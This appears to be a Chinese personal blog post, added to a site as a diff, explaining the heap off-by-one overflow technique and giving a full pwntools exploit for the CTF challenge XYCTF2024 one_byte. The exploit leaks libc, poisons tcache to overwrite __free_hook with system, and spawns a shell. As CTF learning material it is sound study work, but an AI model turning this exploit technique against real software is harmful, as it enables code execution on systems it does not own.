@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Mr.BW">
+
+
+
+
+
+<title>off by one | Mr.BW的妙妙屋</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <link rel="stylesheet" href="/../fonts/iconfont3/iconfont.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+        
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Mr.BW&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Mr.BW&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">全部展开</a>
+        <a onclick="go_top()">回到顶部</a>
+        <a onclick="go_bottom()">回到底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "全部收起"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "全部展开"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">off by one</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Mr.BW</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">八月 26, 2024&nbsp;&nbsp;18:57:31</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/heap/">heap</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="off-by-one介绍"><a href="#off-by-one介绍" class="headerlink" title="off by one介绍"></a>off by one介绍</h1><p>一字节溢出</p>
+<p>程序在输入时对输入的字节检测有误，导致多输入一字节。往往出现在数组中<code>a[4]</code>最大只能访问到<code>a[3]</code>却在输入时把<code>a[4]</code>也输入导致一字节溢出。</p>
+<p>在堆中一字节溢出可以修改下一个堆块的大小或状态</p>
+<p><img src="/../image/off_by_one/1.png" alt="1"></p>
+<p>如图，两个大小为0x30的堆块，但由于off by one漏洞导致第二个堆块申请了0x30的大小，size位却显示0xc0的大小，可以进行后续攻击</p>
+<h1 id="利用-off-by-one"><a href="#利用-off-by-one" class="headerlink" title="利用 off by one"></a>利用 off by one</h1><p>chunk被free后会根据size位进行分配fastbins或tcache等，而不是根据实际申请的大小。因此只要修改了size位后进行free就可以控制堆块进入任意bin中。</p>
+<p>同样的，从bin中申请堆块也是看size位，而不去检查实际的大小。</p>
+<p>申请一个小堆块利用 off by one修改size位改成较大的数值，进行free后会进入管理较大chunk的bin中，再次用一个较大的size2申请出，这样就可以访问size2位大小的值从而造成越界访问。</p>
+<p><img src="/../image/off_by_one/2.png" alt="2"></p>
+<p>如图，0x5cf2f715b720处显示大小为0xc0,实际大小为0x30，因此可以造成越界访问。</p>
+<p>在show的时候可以直接打印出下面chunk的内容，包括标志位。图中下一个chunk刚好在unsortedbin中，因此可以用来泄露libc。</p>
+<p>在edit的时候也可以修改下一个chunk的内容，也包括标志位。若下一个chunk在fastbin中或tcache中，可以修改fd位使其指向任意位置。</p>
+<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>XYCTF2024 one_byte</p>
+<p>GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.14) stable release version 2.31</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>add，free，show，edit。没有UAF</p>
+<p>edit中有一个read_data函数进入后发现</p>
+<p><img src="/../image/off_by_one/3.png" alt="3"></p>
+<p><img src="/../image/off_by_one/4.png" alt="4"></p>
+<p>存在off by one漏洞</p>
+<p>因此可以把tcache填满后，申请一个用于off by one的chunk，一个用于越界访问的chunk，一个与tcache大小相同进入unsortedbin中的chunk（顺序一定要相同），从而泄露libc</p>
+<p>获得libc后，同样的，申请一个用于off by one的chunk，一个用于越界访问的chunk，一个进入tcache尾的chunk，实现申请目标地址</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc6_2.35-0ubuntu3.6_amd64.so&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc-2.27.so&#x27;)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">r=process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment">#r=remote(&#x27;gz.imxbt.cn&#x27;,20321)</span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="comment"># 前七个用于填满tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0x98</span>) </span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x28</span>) <span class="comment">#用该chunk实现off by one 注意大小必须是以8结尾，否则会因为chunk的对齐而多出现8字节无法off by one到下一个chunk</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x28</span>) <span class="comment">#修改这个chunk的size位访问该chunk实现越界访问</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x98</span>) <span class="comment">#进入unsortedbin，因此大小也要为0x98</span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x10</span>)<span class="comment">#防止unsortedbin合并</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>,<span class="string">b&#x27;\xc1&#x27;</span>*<span class="number">0x29</span>)<span class="comment">#开始利用</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)<span class="comment">#此时本应该进入0x30的chunk进入了0xc0</span></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0xb8</span>)<span class="comment">#把8号chunk申请出来</span></span><br><span class="line">free(<span class="number">9</span>)<span class="comment">#进入unsortedbin</span></span><br><span class="line">show(<span class="number">11</span>)<span class="comment">#由于8号chunk本是0x28的大小，size位却为0xc0因此show的时候会show 0xc0-0x8个字节，把下一个被free掉的chunk也给show出来了</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"><span class="comment">#add(8,0xb8)</span></span><br><span class="line">r.recv(<span class="number">0x30</span>)</span><br><span class="line">addr=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ecbe0</span></span><br><span class="line">sys=addr+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">hook=addr+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(hook))</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="string">b&#x27;\x31&#x27;</span>*<span class="number">0x29</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#开始利用tcache实现任意写</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x38</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x19</span>*<span class="string">b&#x27;\x71&#x27;</span>)<span class="comment">#修改2的size位，大小无所谓只要能够到下一个chunk的fd即可</span></span><br><span class="line"><span class="comment">#free(1)</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">3</span>)<span class="comment">#此时是3-&gt;5-&gt;4注意chunk数一定要大于等于2 否则3-&gt;__free_hook 时由于tcache的key导致free_hook申请不出来</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">12</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x41</span>)+p64(hook)*<span class="number">2</span>)<span class="comment">#伪造下一个chunk的fd</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x38</span>)<span class="comment">#把3申请回去</span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x38</span>)<span class="comment">#把__free_hook申请回去</span></span><br><span class="line">edit(<span class="number">5</span>,p64(sys))</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)<span class="comment">#写入参数</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#show(7)</span></span><br><span class="line"><span class="comment">#edit(0,b&#x27;\x00&#x27;*0x18+b&#x27;\x40&#x27;)</span></span><br><span class="line"><span class="comment">#free(0)</span></span><br><span class="line"><span class="comment">#add(1,0x30)</span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/pwn/"># pwn</a>
+                    
+                        <a href="/tags/%E5%AD%A6%E4%B9%A0/"># 学习</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2024/07/31/srop/">srop</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Mr.BW | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+
+</html>
